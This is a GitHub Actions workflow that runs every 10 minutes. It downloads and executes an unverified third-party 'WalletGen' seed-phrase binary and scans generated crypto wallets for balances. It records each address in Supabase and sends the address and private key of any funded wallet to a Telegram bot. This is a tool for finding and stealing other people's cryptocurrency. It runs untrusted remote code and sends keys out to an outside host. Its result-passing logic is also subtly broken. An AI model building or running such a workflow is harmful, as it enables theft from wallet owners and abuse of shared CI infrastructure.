name: WalletGen Scanner

on:
  workflow_dispatch:        # manual trigger
  schedule:
    - cron: "*/10 * * * *"  # run every 10 minutes

jobs:
  run-checker:
    runs-on: ubuntu-latest
    steps:
      - name: Install expect
        run: |
          sudo apt-get update
          sudo apt-get install -y expect jq

      - name: Download release + database file
        run: |
          wget https://github.com/wizdomf3lix/seed-phrase-generator/releases/download/v5%2C0/WalletGen_linux_x64.5.0-linux.tar.gz
          tar -xzf WalletGen_linux_x64.5.0-linux.tar.gz
          curl -L https://raw.githubusercontent.com/mnadamod/walletgens/main/evm_database.txt -o evm_database.txt
          mv evm_database.txt walletgen/

      - name: Verify database file
        run: |
          echo "=== Database line count ==="
          wc -l walletgen/evm_database.txt

      - name: Run checker with expect
        working-directory: walletgen
        run: |
          chmod +x walletgen
          echo "=== Starting walletgen with expect ==="
          expect <<'EOF' | tee result.txt
          log_user 1
          spawn ./walletgen
          expect {
            "select an action using the key:" { send "6\r" }
          }
          expect eof
          EOF
          code=$?
          echo "=== walletgen exit code: $code ==="
          echo "=== Checker Output ==="
          cat result.txt

      - name: Process results and update Supabase
        id: process
        run: |
          found=false
          active_addr=""
          active_priv=""

          # Loop through each address/balance pair
          grep -A1 "address:" result.txt | while read -r line; do
            if [[ $line == address* ]]; then
              addr=$(echo "$line" | awk '{print $2}')
            fi
            if [[ $line == balance* ]]; then
              bal=$(echo "$line" | awk '{print $2}')
              status="empty"
              if [[ "$bal" != "(empty)" && "$bal" != "0.000000$" ]]; then
                status="active"
              fi

              # Check if already in Supabase
              exists=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq.${addr}" \
                -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}")

              if [ "$exists" = "[]" ]; then
                # Insert new wallet with status
                curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
                  -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
                  -H "Content-Type: application/json" \
                  -d "{\"address\":\"$addr\",\"status\":\"$status\"}"
              fi

              if [ "$status" = "active" ]; then
                found=true
                active_addr=$addr
                # Private key parsing if walletgen prints it
                active_priv=$(grep "Private Key:" result.txt | head -n1 | awk '{print $3}')
              fi
            fi
          done

          echo "found=$found" >> $GITHUB_OUTPUT
          echo "address=$active_addr" >> $GITHUB_OUTPUT
          echo "private=$active_priv" >> $GITHUB_OUTPUT

      - name: Notify Telegram
        if: steps.process.outputs.found == 'true'
        run: |
          curl -s -X POST https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage \
          -d chat_id=${{ secrets.TELEGRAM_CHAT_ID }} \
          -d text="ðŸš¨ Active wallet found!\nAddress: ${{ steps.process.outputs.address }}\nPrivate Key: ${{ steps.process.outputs.private }}"

      - name: Debug Supabase table
        run: |
          echo "=== Current Supabase checked_wallets table ==="
          curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" \
            -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq .
